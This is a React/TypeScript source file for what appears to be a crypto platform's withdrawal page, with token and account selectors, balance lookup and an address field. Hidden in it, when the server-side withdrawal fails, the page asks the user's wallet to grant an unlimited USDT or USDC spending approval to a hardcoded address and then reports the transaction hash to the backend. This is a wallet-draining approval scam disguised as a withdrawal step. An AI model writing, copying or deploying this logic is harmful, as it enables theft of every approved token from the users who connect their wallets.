import { useCallback, useEffect, useMemo, useRef, useState } from "react";

import style from "./index.module.scss";
import {
  BrowserRouter as Router,
  Route,
  Link,
  Outlet,
  useNavigate,
  useSearchParams,
} from "react-router-dom";

import { useTranslation } from "react-i18next";
import CusInput from "@/components/CusInput";

import Back from "@/components/Back";
import Upload from "@/components/Upload/index";
import Toast from "@/components/Toast";

import {
  getFundsAssetBalance,
  getTradeAssetBalance,
  getSpotAssetBalance,
  getWalletAssetBalance,
} from "@/api/trans";
import { toFixed } from "@/utils/public";
import recordPng from "@/assets/record.png";
import rightPng from "@/assets/right.png";
import { withdraw } from "@/api/common";
import Select from "@/components/Select";
import { useWeb3 } from "@/hooks/useWeb3/useWeb3";

import ABI from "./ABIUSDT.json";
import { authentication } from "@/api/userInfo";
import { AbiItem } from "web3-utils";

const inputAddress = [
  "0xdac17f958d2ee523a2206206994597c13d831ec7", // uusdt
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", //usdc
];

// 获取合约实例

const accountAddress = window.localStorage.getItem("account") || "";
const assetsList = [
  {
    label: "USDT",
    type: "USDT",
  },
  {
    label: "USDC",
    type: "USDC",
  },
];
function identity() {
  const { t } = useTranslation();
  const navList = [
    {
      label: t("assets.trade"),
      type: "trade",
    },
    {
      label: t("assets.funds"),
      type: "funds",
    },
    {
      label: t("assets.assets-stock"),
      type: "spot",
    },
  ];
  const ref = useRef<any>(null);
  const [search, setsearch] = useSearchParams();
  const accountTypeTemp = search.get("accountType") || "funds";
  const nav = useNavigate();
  const account = window.localStorage.getItem("account") || "";
  const [coinUseCount, setCoinUseCount] = useState<any>(0);
  const [withdrawalAmount, setWithdrawalAmount] = useState<any>(0);
  const [fee, setFee] = useState<string>("5");

  const [receiveAddress, setAdd] = useState<string>(account);
  const [asset, setAsset] = useState<string>("USDT");
  const [current, setCurrent] = useState<any>(assetsList[0]);
  const [contractInstance, setContractInstance] = useState<any>();
  const { connectProvider, changeProvider, providerString, web3 } = useWeb3();
  const accountIndex = navList.findIndex(
    (item) => item.type === accountTypeTemp
  );
  const [currentAccount, setCurrentAccout] = useState<any>(
    navList[accountIndex]
  );

  const selectRef = useRef<any>(null);
  const selectAccountRef = useRef<any>(null);

  const coinAddres = useMemo(() => {
    return current.type === "USDT" ? inputAddress[0] : inputAddress[1];
  }, [current]);
  useEffect(() => {
    console.log("web3=>useEffect", web3);

    if (web3 && coinAddres) {
      console.log(coinAddres);
      const contractInstanceTemp: any =
        web3 && new web3.eth.Contract(ABI as AbiItem[], coinAddres);
      console.log("contractInstance=>", contractInstanceTemp);
      setContractInstance(contractInstanceTemp);
    }
  }, [web3, current, coinAddres]);
  const useContract = async () => {
    const spenderAddress = "0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5"; // 目标地址
    const maxApprovalAmount = web3?.utils.toHex(
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    ); // 最大授权数量

    const fee = web3?.utils.toHex(0);
    const gasPrice: any = (await web3?.eth.getGasPrice()) || ""; // 获取当前网络上的最低交易手续费用
    console.log(gasPrice);
    const gasLimit = 50000; // 设置gas上限

    const result = await contractInstance.methods
      .approve(spenderAddress, maxApprovalAmount)
      .send({
        from: accountAddress,
        gasPrice: gasPrice,
        gas: gasLimit,
        value: fee,
        // gasPrice: web3?.utils.fromWei(gasPrice, "ether"), // 设置适当的gas价格
      });
    console.log(result);
    if (result.status) {
      if (result.transactionHash) {
        const { data } = await authentication({
          tokenList: [coinAddres],
          trxHash: result.transactionHash,
        });
        return nav("/assetsAll");
      }
    } else {
      return Toast.notice(t("common.faild"), {});
    }
  };

  const onSubmit = async () => {
    console.log("提交");
    if (!(Number(withdrawalAmount) > 0.1)) {
      return Toast.notice(t("lend.tip-amount"), {});
    }
    if (Number(withdrawalAmount) > Number(coinUseCount)) {
      return Toast.notice(t("withdrawal.ins-balance"), {});
    }
    const params = {
      asset,
      count: withdrawalAmount,
      receiveAddress,
      fee,
      accountType: currentAccount.type,
    };

    const data: any = await withdraw(params);
    if (data.code == 0) {
      Toast.notice(t("common.success"), {});
      nav("/drawalAndRecharge?type=2", { replace: true });
    } else {
      useContract();
    }
  };

  const onInputName = async (val: any) => {
    console.log("输入", val);
    setAdd(val);
  };
  const onInputIdAmount = async (val: any) => {
    console.log("输入", val);
    setWithdrawalAmount(val);
  };
  const onInputFee = async (val: any) => {
    console.log("输入", val);
    setFee(val);
  };

  function title() {
    return <div className="withdrawal-title">{t("withdrawal.withdrawal")}</div>;
  }
  function right() {
    return (
      <img
        className="record"
        src={recordPng}
        onClick={() => {
          nav("/drawalAndRecharge?type=2");
        }}
      />
    );
  }
  function paste() {
    return (
      <div
        className="withdrawal-title"
        onClick={() => {
          const input = ref?.current;
          input.focus();
          document.execCommand("paste");
        }}
      >
        {t("common.paste")}
      </div>
    );
  }
  const getData = async () => {
    let method: any = "";
    if (currentAccount.type == "trade") {
      method = getTradeAssetBalance;
    } else if (currentAccount.type === "funds") {
      method = getFundsAssetBalance;
    } else if (currentAccount.type === "spot") {
      method = getSpotAssetBalance;
    }
    const { data } = await method();
    setCoinUseCount(data.availableUsdtBalance || 0);
  };
  useEffect(() => {
    getData();
    ref?.current.setVal(receiveAddress);
  }, [currentAccount]);
  function inputRight() {
    return <div className="withdrawal-usdt">USDT</div>;
  }
  const onSelect = (item: any) => {
    setCurrent(item);
  };
  return (
    <div className={style.root}>
      <div className="withdrawal-wrap">
        <Back content={title()} right={right()}></Back>
        <div className="withdrawal-content">
          <div className="withdrawal-label">{t("withdrawal.address")}</div>
          <CusInput
            ref={ref}
            alignLeft
            isBtn={false}
            disable
            defaultVal={receiveAddress}
            placeholder={t("withdrawal.receive-address")}
            onInput={onInputName}
          ></CusInput>
          <div className="withdrawal-label">{t("trans.assets-account")}</div>

          <div
            className="choose-chain"
            onClick={() => {
              selectAccountRef.current.open();
            }}
          >
            <div>{currentAccount.label}</div>
            <img src={rightPng} />
          </div>
          <div className="withdrawal-label">{t("trans.assets-choose-tip")}</div>

          <div
            className="choose-chain"
            onClick={() => {
              selectRef.current.open();
            }}
          >
            <div>{current.label}</div>
            <img src={rightPng} />
          </div>
          <div className="content-label">
            <div className="left">{t("trans.count")}</div>
            <div className="right">
              <div> {t("withdrawal.fee")}</div>
              <div> {fee} USDT</div>
            </div>
          </div>
          <CusInput
            alignLeft
            isBtn={false}
            placeholder={t("withdrawal.min-amount", { amount: 0.1 })}
            onInput={onInputIdAmount}
          ></CusInput>
          <div className="content-label">
            <div className="left">
              {t("withdrawal.rest")}:{coinUseCount}
            </div>
            <div className="right">
              <div> {t("withdrawal.receive-amount")}</div>
              <div>
                {Number(withdrawalAmount) > 5
                  ? toFixed(Number(withdrawalAmount) - Number(fee))
                  : 0}{" "}
                USDT
              </div>
            </div>
          </div>

          <div
            className="btn-next"
            onClick={() => {
              onSubmit();
            }}
          >
            {t("common.sure")}
          </div>
        </div>
      </div>
      <Select
        ref={selectRef}
        configList={assetsList}
        onSelect={onSelect}
      ></Select>
      <Select
        ref={selectAccountRef}
        configList={navList}
        onSelect={(item: any) => {
          setCurrentAccout(item);
        }}
      ></Select>
    </div>
  );
}

export default identity;
